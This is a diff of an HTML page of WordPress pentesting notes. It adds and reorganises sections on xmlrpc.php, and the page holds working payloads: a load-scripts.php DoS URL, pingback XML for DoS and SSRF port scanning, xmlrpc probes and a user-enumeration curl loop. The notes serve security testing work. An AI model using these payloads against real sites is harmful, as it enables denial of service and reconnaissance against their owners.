@@ -10,13 +10,13 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://www.grayhatfreelancing.com/docs/wordpress/" /><meta property="article:section" content="docs" />
 <meta property="article:published_time" content="2022-11-20T00:00:00+00:00" />
-<meta property="article:modified_time" content="2022-12-10T11:35:25-05:00" />
+<meta property="article:modified_time" content="2022-12-31T02:34:35-05:00" />
 <title>Wordpress Security | Gray Hat Freelancing</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.c3b45b6301b51f548f0398109b6e109d45abf1314e421f8ba62cf6f72646f958.js" integrity="sha256-w7RbYwG1H1SPA5gQm24QnUWr8TFOQh&#43;Lpiz29yZG&#43;Vg=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.4e979c41ea1da3eadea6cff7d8575b0664a8627f9c4b12e833490d3df55a9f7b.js" integrity="sha256-TpecQeodo&#43;reps/32FdbBmSoYn&#43;cSxLoM0kNPfVan3s=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -81,10 +81,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-  
-    
-  
-
 
 
 <ul class="book-languages">
@@ -98,12 +94,6 @@ https://github.com/alex-shpak/hugo-book
     </label>
 
     <ul>
-      
-      <li>
-        <a href="https://www.grayhatfreelancing.com/ru/">
-          Ukrainian
-        </a>
-      </li>
       
     </ul>
   </li>
@@ -1415,11 +1405,17 @@ https://github.com/alex-shpak/hugo-book
           <ul>
             <li><a href="#load-scriptsphp-denial-of-service">load-scripts.php denial of service</a></li>
             <li><a href="#check-ip-behind-cloudflare">Check IP behind Cloudflare</a></li>
-            <li><a href="#testing-xml-rpc-on-all-wordpress-versions">Testing xml-rpc on all Wordpress versions</a></li>
-            <li><a href="#pingbackxml">pingback.xml</a></li>
+          </ul>
+        </li>
+        <li><a href="#testing-xml-rpc-on-all-wordpress-versions">Testing xml-rpc on all Wordpress versions</a>
+          <ul>
+            <li><a href="#pingbackxml-can-be-used-for-dos-and-potential-to-zombie-into-a-ddos">pingback.xml (can be used for DoS and potential to zombie into a DDoS)</a></li>
+            <li><a href="#wordpress-xml-rpcphp-ssrf-internallocal-port-scan">WordPress xml-rpc.php SSRF (internal/local port scan)</a></li>
             <li><a href="#lsist-available-methods-through-xml-rpc">Lsist available methods through xml-rpc</a></li>
             <li><a href="#check-for-presence-of-xmlrpc">Check for presence of xmlrpc</a></li>
+            <li><a href="#xml-rpcphp-tool">xml-rpc.php tool</a></li>
             <li><a href="#enumerate-users">Enumerate users</a></li>
+            <li><a href="#common-misconfigurations">Common Misconfigurations:</a></li>
           </ul>
         </li>
       </ul>
@@ -1441,16 +1437,13 @@ https://github.com/alex-shpak/hugo-book
   <a class="anchor" href="#wordpress-tools">#</a>
 </h2>
 <ul>
-<li>
-  <a href="WPScan">https://github.com/wpscanteam/wpscan</a> - One of the better tools at it&rsquo;s just.
+<li><a href="WPScan">https://github.com/wpscanteam/wpscan</a> - One of the better tools at it&rsquo;s just.
 &ndash; gem install wpscan
 &ndash; docker pull wpscanteam/wpscan
 &ndash; wpscan &ndash;update # updates the database
 &ndash; Users of pentesting distrobutions generally should install the version from their repository.</li>
-<li>
-  <a href="https://github.com/nullfil3/xmlrpc-scan">https://github.com/nullfil3/xmlrpc-scan</a></li>
-<li>
-  <a href="https://github.com/relarizky/wpxploit">https://github.com/relarizky/wpxploit</a></li>
+<li><a href="https://github.com/nullfil3/xmlrpc-scan">https://github.com/nullfil3/xmlrpc-scan</a></li>
+<li><a href="https://github.com/relarizky/wpxploit">https://github.com/relarizky/wpxploit</a></li>
 </ul>
 <h2 id="wordpress-tricks">
   Wordpress Tricks:
@@ -1461,24 +1454,22 @@ https://github.com/alex-shpak/hugo-book
   <a class="anchor" href="#load-scriptsphp-denial-of-service">#</a>
 </h3>
 <p><code>load-scripts.php</code> resource exhaustion
-<strong>Wordpress versions 4.9.3</strong> and prior:
-/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter</p>
-<h3 id="check-ip-behind-cloudflare">
+<strong>Wordpress versions 4.9.3</strong> and prior:</p>
+<pre tabindex="0"><code>/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
+</code></pre><h3 id="check-ip-behind-cloudflare">
   Check IP behind Cloudflare
   <a class="anchor" href="#check-ip-behind-cloudflare">#</a>
 </h3>
-<p>
-  <a href="https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/">https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/</a>
+<p><a href="https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/">https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/</a>
 Get the IP address of a target wordpress website by abusing the ping-back feature</p>
-<h3 id="testing-xml-rpc-on-all-wordpress-versions">
+<h2 id="testing-xml-rpc-on-all-wordpress-versions">
   Testing xml-rpc on all Wordpress versions
   <a class="anchor" href="#testing-xml-rpc-on-all-wordpress-versions">#</a>
-</h3>
-<p>
-  <a href="https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/">https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/</a></p>
-<h3 id="pingbackxml">
-  pingback.xml
-  <a class="anchor" href="#pingbackxml">#</a>
+</h2>
+<p><a href="https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/">https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/</a></p>
+<h3 id="pingbackxml-can-be-used-for-dos-and-potential-to-zombie-into-a-ddos">
+  pingback.xml (can be used for DoS and potential to zombie into a DDoS)
+  <a class="anchor" href="#pingbackxml-can-be-used-for-dos-and-potential-to-zombie-into-a-ddos">#</a>
 </h3>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;iso-8859-1&#34;?&gt;
 &lt;methodCall&gt;
@@ -1496,11 +1487,15 @@ Get the IP address of a target wordpress website by abusing the ping-back featur
  &lt;/param&gt;
 &lt;/params&gt;
 &lt;/methodCall&gt;
-
-&lt;methodCall&gt;
+</code></pre><h3 id="wordpress-xml-rpcphp-ssrf-internallocal-port-scan">
+  WordPress xml-rpc.php SSRF (internal/local port scan)
+  <a class="anchor" href="#wordpress-xml-rpcphp-ssrf-internallocal-port-scan">#</a>
+</h3>
+<p>Easy example would be to check a port that needs to be open or is generally open internally</p>
+<pre tabindex="0"><code>&lt;methodCall&gt;
 &lt;methodName&gt;pingback.ping&lt;/methodName&gt;
 &lt;params&gt;&lt;param&gt;
-&lt;value&gt;&lt;string&gt;http://&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;/string&gt;&lt;/value&gt;
+&lt;value&gt;&lt;string&gt;http://&lt;TARGET-TO-SCAN&gt;:&lt;PORT-TO-CHECK&gt;&lt;/string&gt;&lt;/value&gt;
 &lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;/string&gt;
 &lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
 &lt;/methodCall&gt;
@@ -1518,13 +1513,27 @@ Get the IP address of a target wordpress website by abusing the ping-back featur
   <a class="anchor" href="#check-for-presence-of-xmlrpc">#</a>
 </h3>
 <p><code>curl -d '&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;demo.sayHello&lt;/methodName&gt;&lt;params/&gt;&lt;/methodCall&gt;' -k https://example.com/xmlrpc.php</code></p>
+<h3 id="xml-rpcphp-tool">
+  xml-rpc.php tool
+  <a class="anchor" href="#xml-rpcphp-tool">#</a>
+</h3>
+<ul>
+<li><a href="https://github.com/nullfil3/xmlrpc-scan">https://github.com/nullfil3/xmlrpc-scan</a></li>
+</ul>
 <h3 id="enumerate-users">
   Enumerate users
   <a class="anchor" href="#enumerate-users">#</a>
 </h3>
 <pre tabindex="0"><code>for i in {1..50}; do curl -s -L -i https://example.com/wordpress?author=$i | grep -E -o &#34;Location:.*&#34; | awk -F/ &#39;{print $NF}&#39;; done
-</code></pre><p>
-  <a href="https://site.com/wp-json/wp/v2/users/">https://site.com/wp-json/wp/v2/users/</a></p>
+</code></pre><p><a href="https://site.com/wp-json/wp/v2/users/">https://site.com/wp-json/wp/v2/users/</a></p>
+<h3 id="common-misconfigurations">
+  Common Misconfigurations:
+  <a class="anchor" href="#common-misconfigurations">#</a>
+</h3>
+<ul>
+<li>Often admins will forget to disable directory listing even for sensitive directories (plugins/themes/etc.. worth checking, I always try /wp-content/uploads/ hoping for directory listing)</li>
+<li>wp-cron.php denial of service: If they&rsquo;re running any kind of older WP then wp-cron runs every time a web page is loaded. For sites make use of several plugins or poorly coded plugins or even just things that take a while to complete (rebuilding cache?), a flood of requests can cause the wp-cron.php method to take the site down..</li>
+</ul>
 </article>
  
       
@@ -1534,9 +1543,9 @@ Get the IP address of a target wordpress website by abusing the ping-back featur
   <div class="flex flex-wrap justify-between">
 
 
-  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d" title='Last modified by Stuart Gray | December 10, 2022' target="_blank" rel="noopener">
+  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/79d022405f79a9936eaa3bc3445f2b63bdc818b0" title='Last modified by Stuart Gray | December 31, 2022' target="_blank" rel="noopener">
       <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>December 10, 2022</span>
+      <span>December 31, 2022</span>
     </a>
   </div>
 
@@ -1575,11 +1584,17 @@ Get the IP address of a target wordpress website by abusing the ping-back featur
           <ul>
             <li><a href="#load-scriptsphp-denial-of-service">load-scripts.php denial of service</a></li>
             <li><a href="#check-ip-behind-cloudflare">Check IP behind Cloudflare</a></li>
-            <li><a href="#testing-xml-rpc-on-all-wordpress-versions">Testing xml-rpc on all Wordpress versions</a></li>
-            <li><a href="#pingbackxml">pingback.xml</a></li>
+          </ul>
+        </li>
+        <li><a href="#testing-xml-rpc-on-all-wordpress-versions">Testing xml-rpc on all Wordpress versions</a>
+          <ul>
+            <li><a href="#pingbackxml-can-be-used-for-dos-and-potential-to-zombie-into-a-ddos">pingback.xml (can be used for DoS and potential to zombie into a DDoS)</a></li>
+            <li><a href="#wordpress-xml-rpcphp-ssrf-internallocal-port-scan">WordPress xml-rpc.php SSRF (internal/local port scan)</a></li>
             <li><a href="#lsist-available-methods-through-xml-rpc">Lsist available methods through xml-rpc</a></li>
             <li><a href="#check-for-presence-of-xmlrpc">Check for presence of xmlrpc</a></li>
+            <li><a href="#xml-rpcphp-tool">xml-rpc.php tool</a></li>
             <li><a href="#enumerate-users">Enumerate users</a></li>
+            <li><a href="#common-misconfigurations">Common Misconfigurations:</a></li>
           </ul>
         </li>
       </ul>
